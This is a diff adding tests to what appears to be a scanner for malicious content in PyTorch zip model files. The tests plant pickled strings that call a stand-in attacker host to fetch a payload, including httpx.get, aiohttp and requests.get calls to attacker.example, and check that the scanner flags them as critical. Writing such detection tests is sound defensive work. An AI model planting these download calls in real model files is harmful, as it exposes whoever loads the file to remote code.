@@ -8083,6 +8083,54 @@ def test_pytorch_zip_keeps_executable_network_pickle_literal_actionable(tmp_path
     )
 
 
+def test_pytorch_zip_keeps_later_network_function_after_inert_url_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "network-function-code.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps(
+        {
+            "docs": "https://docs.example.invalid/reference/requests.get(url)",
+            "loader": "requests.get(endpoint)",
+        },
+        protocol=0,
+    )
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.rule_code == "S302"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "network_function"
+        and issue.details.get("function") == "requests.get"
+        for issue in result.issues
+    )
+
+
+@pytest.mark.parametrize(
+    "literal",
+    [
+        "httpx.get('https://attacker.example/payload')",
+        "aiohttp.ClientSession().get('https://attacker.example/payload')",
+    ],
+)
+def test_pytorch_zip_keeps_supported_http_client_url_actionable(tmp_path: Path, literal: str) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "http-client-code.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps({"loader": literal}, protocol=0)
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
 def test_pytorch_zip_keeps_spaced_network_attribute_url_actionable(tmp_path: Path) -> None:
     model_path = create_mock_pytorch_zip(tmp_path / "spaced-network-code.pt", with_pickle=False, prefix="archive")
     payload = pickle.dumps({"loader": "requests . get('https://attacker.example/payload')"}, protocol=0)
